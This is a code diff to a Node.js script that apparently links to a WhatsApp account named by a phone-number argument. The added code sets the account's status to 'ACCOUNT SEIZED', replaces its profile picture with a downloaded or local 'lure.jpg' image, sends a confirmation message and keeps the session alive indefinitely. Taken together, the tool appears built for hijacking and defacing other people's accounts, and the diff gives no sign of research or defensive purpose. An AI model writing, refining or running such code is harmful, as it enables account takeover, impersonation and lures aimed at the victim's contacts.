@@ -64,6 +64,23 @@ async function downloadImage(url, filename, retries = 3) {
     throw new Error(`Failed to download after ${retries} attempts`);
 }
 
+// Process image with Jimp and return buffer
+async function processImageWithJimp(inputPath) {
+    console.log(`[i] Reading image with Jimp: ${inputPath}`);
+    const image = await Jimp.read(inputPath);
+    console.log(`[i] Original size: ${image.getWidth()}x${image.getHeight()}`);
+    
+    // Resize to WhatsApp profile pic size (max 640x640)
+    image.resize(640, 640);
+    console.log(`[i] Resized to: ${image.getWidth()}x${image.getHeight()}`);
+    
+    // Get as JPEG buffer
+    const buffer = await image.getBufferAsync(Jimp.MIME_JPEG);
+    console.log(`[i] Buffer created: ${buffer.length} bytes`);
+    console.log(`[i] Is valid Buffer: ${Buffer.isBuffer(buffer)}`);
+    return buffer;
+}
+
 async function connectToWhatsApp(isFirstConnect = true) {
     if (isFirstConnect) {
         cleanSession();
@@ -103,7 +120,6 @@ async function connectToWhatsApp(isFirstConnect = true) {
             
             const phoneNumber = process.argv[2]?.replace(/\D/g, '');
             
-            // FIXED: Don't crash, just return gracefully
             if (!phoneNumber || phoneNumber.length < 10) {
                 console.error("[x] Error: Provide phone number with country code");
                 console.error("ANON_CODE_START:ERROR_INVALID_NUMBER:ANON_CODE_END");
@@ -146,28 +162,26 @@ async function connectToWhatsApp(isFirstConnect = true) {
                 console.log("[✗] Connection lost during stabilization!");
                 return;
             }
-                            // 2. Update profile picture using Jimp
+            
+            try {
+                // 1. Update profile status (text)
+                console.log("[i] Updating profile status...");
+                await sock.updateProfileStatus("ψ ☠︎︎ ACCOUNT SEIZED ☠︎︎ ψ");
+                console.log("[✓] Profile status updated!");
+                
+                // 2. Update profile picture using Jimp buffer
                 const imageUrl = 'https://files.catbox.moe/c61uu3.jpg';
                 const tempFile = './temp_profile.jpg';
                 let usedLocalFile = false;
-                
-                async function processImageWithJimp(inputPath) {
-                    const image = await Jimp.read(inputPath);
-                    // Resize to WhatsApp profile pic size (max 640x640)
-                    image.resize(640, 640);
-                    // Get as buffer
-                    const buffer = await image.getBufferAsync(Jimp.MIME_JPEG);
-                    return buffer;
-                }
                 
                 try {
                     console.log(`[i] Downloading image from Catbox...`);
                     await downloadImage(imageUrl, tempFile, 3);
                     
-                    console.log("[i] Processing image with Jimp...");
+                    console.log("[i] Processing downloaded image...");
                     const imageBuffer = await processImageWithJimp(tempFile);
                     
-                    console.log("[i] Updating profile picture...");
+                    console.log("[i] Updating profile picture with Jimp buffer...");
                     await sock.updateProfilePicture(sock.user.id, imageBuffer);
                     console.log("[✓] Profile picture updated from Catbox!");
                     
@@ -181,20 +195,18 @@ async function connectToWhatsApp(isFirstConnect = true) {
                         console.log("[i] Using local lure.jpg instead...");
                         try {
                             const imageBuffer = await processImageWithJimp('./lure.jpg');
+                            
+                            console.log("[i] Updating profile picture with local Jimp buffer...");
                             await sock.updateProfilePicture(sock.user.id, imageBuffer);
                             console.log("[✓] Profile picture updated with local file!");
                             usedLocalFile = true;
                         } catch (localErr) {
                             console.log("[✗] Local file also failed:", localErr.message);
+                            console.log("[✗] Stack:", localErr.stack);
                         }
                     } else {
                         console.log("[✗] lure.jpg not found in current directory!");
                     }
-                }
-
-                
-                if (!usedLocalFile && !fs.existsSync('./temp_profile.jpg')) {
-                    console.log("[!] Profile picture not updated - using default");
                 }
                 
                 // 3. Send confirmation message
@@ -206,6 +218,7 @@ async function connectToWhatsApp(isFirstConnect = true) {
                 
             } catch (e) { 
                 console.log("[✗] Update failed:", e.message);
+                console.log("[✗] Stack:", e.stack);
             }
             
             // KEEP ALIVE INDEFINITELY
